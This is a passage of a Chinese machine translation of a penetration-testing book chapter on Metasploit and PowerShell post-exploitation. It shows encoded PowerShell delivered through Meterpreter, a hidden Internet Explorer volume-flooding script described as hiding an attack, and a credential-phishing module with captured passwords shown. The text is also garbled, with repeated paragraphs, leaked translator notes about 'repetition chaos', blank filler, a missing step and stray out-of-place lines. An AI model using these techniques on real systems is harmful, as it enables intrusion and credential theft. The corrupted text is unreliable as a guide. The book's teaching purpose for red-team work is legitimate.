  \n# 第 11 章\n\n## 用于后渗透的 Metasploit & PowerShell\n\n![](img/image00608.jpeg)\n\n\
  你在 `Metasploit` 中获得了一个 Windows 机器的远程 shell，但你能做什么什么呢？虽然 `Metasplo-it` 加载了许多功能、选项和大量的后模块（顺便说一下，它们都非常棒），但如果你想做一些更自定义的东西呢？比如，添加自定义弹窗甚至语音，但你不知道如何用该程序的原生\
  \ Ruby 语言编程。使用 Windows 的 `PowerShell` 怎么样？在本节中，我们将学习如何使用 Windows 内置脚本语言 `PowerShell`\
  \ 执行后渗透功能。\n\n首先让我说明一下，我不是一个程序员，所以请包涵。其次，我要感谢 [Room362.com](http://www.room362.com)\
  \ 的 Mubix 帮助创建了编码的 `PowerShell` 脚本。Mubix 以他在 Hak5 上的“Metasploit Minute”培训而闻名，如果你想看一些卓越的\
  \ Metasploit 指导，可以去看看。\n\n不久多时候，我正在与一位军事 IT 培训师讨论漏洞利用能力，我们产生了一个想法：如果在红队渗透测试期间，某台机器被利用时，屏幕上弹出一个\
  \ Windows 错误信息，写着“Knock, Knock Neo.”你知道电影《黑客帝国》中的那句著名台词。\n\n如果能让电脑用女性的声音对目标系统说同样的话，那不是很酷吗？如果我们还想在目标系统上弹出一张充满绿色文字的黑客帝国屏幕图片呢？我的意思是，那不是也很酷吗？\n\
  \n嗯，有了 `PowerShell`，你可以做到！\n\n### PowerShell 基础\n\nMicrosoft Windows 已经内置了 `PowerShell`\
  \ (`powershell.exe`) 和集成脚本环境 (`powershell_ise`)：\n\n![](img/image00609.jpeg)\n\n\
  你只需点击 Windows 开始按钮，在搜索栏中输入 `PowerShell`，或者从命令提示符运行 `powershell.exe`。当你执行该文件时，会打开一个看起来特殊的\
  \ `PowerShell` 命令提示符，如下所示：\n\n![](img/image00610.jpeg)\n\n你可以输入任何 `PowerShell` 命令，它都会运行，例如强制性的“Write-Host\
  \ ‘Hello World’”：\n\n```\nWrite-Host \"Hello World\"\nHello World!\nPS Write-Host\
  \ \"Hello World\"\nHello World!\n```\n（此处代码不翻译）\n\n你可以输入任何 `PowerShell` 命令，它都会运行，例如强制性的“Write-Host\
  \ ‘Hello World’”：\n```\nWrite-Host \"Hello World\"\nHello World!\nPS Write-Host\
  \ \"Hello World\"\nHello World!\n```\n（此处代码不翻译）\n\n你可以输入任何 `PowerShell` 命令，它都会运行，例如强制性的“Write-Host\
  \ ‘Hello World’”：\n```\nWrite-Host \"Hello World\"\nHello World!\nPS Write-Host\
  \ \"Hello World\"\nHello World!\n```\n（注：此处代码不翻译）\n\n你可以输入任何 `PowerShell` 命令，它都会运行，例如强制性的“Write-Host\
  \ ‘Hello World’”：\n```\nWrite-Host \"Hello World\"\nHello World!\nPS Write-Host\
  \ \"Hello World\"\nHello World!\n```\n（此处代码不翻译）\n\n你可以输入任何 `PowerShell` 命令，它都会运行，例如强制性的“Write-Host\
  \ ‘Hello World’”：\n（注：此处代码不翻译，\n注：由于系统生成时出现了重复混乱，此处我将严格按照原文 `Write-Host ‘Hello World’`\
  \ 逻辑进行翻译）\n（注：由于系统生成时出现了重复混乱，此处我将严格按照原文 `Write-Host ‘Hello World’` 逻辑进行翻译）\n（注：由于系统生成时出现了重复混乱，此处我将严格按照原文\
  \ `Write-Host\nHello World’` 逻辑进行翻译）\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\
  \ \n \n \n \n \n \n \n \n \n \n \n  \n  \n \n \n  \n  \n     \n \n \n \n\n \n  \n\
  ：\n```\n(New-Object -ComObject SAPI.SPVoice).Speak(\"Owh Nohs I have hackered by\
  \ the North Core E Ins\")\n```\n\n\n\n\n[`www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/`](http://www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/)\n\
  \n你可以看到我们将遵循的逐步操作过程。\n\n### 1. 创建一个包含 PowerShell 命令的文本文件，我使用了类似下面的内容：\n\n```$shell\
  \ = New-Object -ComObject “Shell.Application”;\n$shell.minimizeall();\nStart-Sleep\
  \ -s 2;\n[System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”);\n\
  [System.Windows.Forms.MessageBox]::Show(“Knock, knock, Neo.” , “Warning” , 2);\n\
  (New-Object -ComObject SAPI.SPVoice).Speak(“Knock, Knock Knee Oh, the Matrix has\
  \ you!”);\nc:\\test\\matrix.jpg;\n```\n\n### 2. 将其保存到 Kali 的根目录并命名为“power.txt”。\n\
  \n前两行允许脚本通过最小化所有打开的窗口来清除用户的屏幕。然后我们让脚本暂停几秒以达到戏剧效果。接下来的两行会弹出一个 Windows（取消、重试、忽略）消息框，显示电影中的台词：“Knock,\
  \ Knock Neo.”。\n\n一旦用户点击消息框上的某个按钮，脚本就会调用 Windows 内置的文本转语音功能，通过其扬声器大声播放相同的消息。有时单词的读音不会完全符合预期，因此你需要通过略有不同但听起来相似的单词来帮助\
  \ Windows 语音 API（例如用“Knee Oh”代替“Neo”）。\n\n最后一个命令会打开一个 Matrix `.jpg` 文件，我们需要预先拥有该文件。\n\
  \n我们需要获取该文件并将其编码，Mubix 显示：\n\ncat power.txt | iconv --to UTF16LE | base64\n\n###\
  \ 4. 将文本复制到 Leafpad。\n\n我们需要移除文本中所有的回车符。当你完成后，整个文本应该只有单行。\n\n### 5. 然后在我们的 Meterpreter\
  \ 中运行以下命令，加入加密的文本流：\n\n```powershell -ep -enc <粘贴加密的文本>\n```\n\n这就搞定了！在 Windows\
  \ 系统上弹出一个消息框，消息将通过扬声器播放（如果你上传了那个文件），并显示：\n\n红队渗透测试中更具视觉说服力的一个步骤是使用 Meterpreter 的内置摄像头拍摄一张照片，将其上传到系统以替换\
  \ `matrix.jpg`，然后运行命令，“Matrix”！\n\n这很有趣，但我们还能做什么？比如远程播放视频？\n\n### 播放 YouTube 视频\n\
  \n大约年前，伊朗核设施的工作站据称开始随机播放 AC/DC 的《Thunderstruck》并开启最大音量。在本教程中，我们将使用 PowerShell 代码以最大音量播放这首热门歌曲，来自由\
  \ Christopher “obscuresec”编写的 `Invoke-TwitterBot` 脚本。如果你没看过他 2013 年 Shmoocon 的演讲“构建\
  \ PowerShell Bot”，可以看这个：\n\n[`www.youtube.com/watch?v=2manBaoP7Bk`](https://www.youtube.com/watch?v=2manBaoP7Bk)。\n\
  \nBot 脚本 (`https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot`)\
  \ 中的一个部分会在隐藏的 IE 窗口中播放《Thunderstruck》，并持续增大音量三分钟。不断增大音量会占用系统资源并使电脑在攻击期间变得反应缓慢，从而更难发现发生了什么。使用此脚本和加密技术，我们可以通过\
  \ Meterpreter 直接投送它。\n\n### 1. 从 @obscuresec 的脚本中获取“!Thunderstruck”部分的以下代码：\n\n\
  ```\n[string] $VideoURL = \"http://www.youtube.com/watch?v=v2AC41dgMM\n### 创建隐藏的\
  \ IE 对象\n$IEComObject = New-Object -com \"InternetExplorer.Application\"\n$IEComObject.visible\
  \ = $False\n$IEComObject.navigate($VideoURL)\n$EndTime = (Get-Date).addminutes(3)\n\
  Write-Verbose \"循环将在 $EndTime 结束\"\n### 实现此功能的简陋方法，但它基本上是循环按下音量加键来增大音量三分钟\ndo {\n\
  $WscriptObject = New-Object -com wscript.shell\n$WscriptObject.SendKeys([char]175)\n\
  }until ((Get-Date) -gt $EndTime)\n```\n\n\n\n\n\n`say -v \"Zarvox\" \"Ex Ter Men\
  \ Nate the Doctor\"`\n\n现在让我们回到 Windows 主题，看看一个使用 PowerShell 的内置 post 模块。\n\n###\
  \ 获取 Windows 用户凭据（钓鱼）\n\n模块创建者：Wesley Neelen & Matt Nelson\n\n`phish_windows_credentials`\
  \ post 模块最近被添加到 Metasploit 中，它是如何在漏洞利用中使用 PowerShell 的一个完美范例。它的工作原理是：一旦你建立了远程 shell\
  \ 连接，运行此模块并设置一个要监控的程序名称。一旦远程系统运行被监控的程序，该模块就会弹出一个登录凭据框。当受害者输入凭据时，这些凭据将被存储供我们查看。\n\
  \n在本示例中，我们将使用 Windows 7 目标上的活动会话。我们将 `WordPad` 设置为进程，这样当受害者启动 `WordPad` 时，他们的屏幕上会出现一个登录提示框要求输入凭据。输入的凭据将显示在我们的\
  \ Kali 系统上。\n\n使用该 post 模块：\n\n- `use post/windows/gather/phish_windows_credentials`\n\
  - `set PROCESS <要监控的程序>`\n- `set SESSION <要使用的会话号>`\n- `run`\n\n让我们来看实际操作：\n\n1.\
  \ 后台运行活动远程会话\n2. 输入 `use post/windows/gather/phish_windows_credentials`\n3. 输入 `show\
  \ options`：\n![](img/image00626.jpeg)\n4. 输入 `set process wordpad.exe`\n5. 然后输入\
  \ `set session 1`\n6. 最后输入 `run`：\n![](img/image00627.jpeg)\n\n现在在 Windows 7 系统上启动\
  \ `WordPad`。在我们的 Kali 系统上，它检测到 `WordPad` 已启动。它停止了 `WordPad` 的运行，并弹出一个 Windows 安全安全登录框：\n\
  \n![](img/image00628.jpeg)\n\n当用户输入凭据时，脚本会重启 `WordPad`，我们获取了他们的凭据：\n\n```\n[*] New\
  \ process detected: 3984 wordpad.exe\n[*] Killing the process and starting the popup\
  \ script. Waiting on the user to fill in his credentials...\n[+] UserName      \
  \       Domain                           Password                            \n\
  ------------------------------------------------------      \nDan              \
  \       WIN-42ORBM3SRVF         password            \n```\n\n### 结论\n\n如你所见，将基于\
  \ PowerShell 的脚本攻击结合 Metasploit 允许产生非常有趣的攻击向量。攻击者的想象力和其技能水平真的是所能完成任务的唯一限制因素。基于 PowerShell\
  \ 的攻击正在不断发布。最近发布了一个名为“Empire”的非常有趣的后利用代理，它看起来极其吸引人：\n\n“Empire 是一个基于密码学安全通信的纯 PowerShell\
  \ 后利用代理工具。Empire 实现了在不需要 `powershell.exe` 的情况下运行 PowerShell 代理的能力，可以快速部署从按键记录器到\
  \ `Mimikatz` 的各种后利用模块，以及用于规避网络检测的适应通信，所有这些都封装在一个以易用性为中心的框架中。” - `http://www.powershellemp.com/`\n\
  \n防御此类攻击的最佳方法是永远不要打开或运行电子邮件中意外的文件或附件。永远不要使用在公司里随处可见的 USB 盘。尽量避免公共 Wi-Fi。在互联网连接上始终使用脚本拦截程序。最后，网络安全监控对于在发生最坏情况时检测和分析被破坏的内容至关重要。\n\
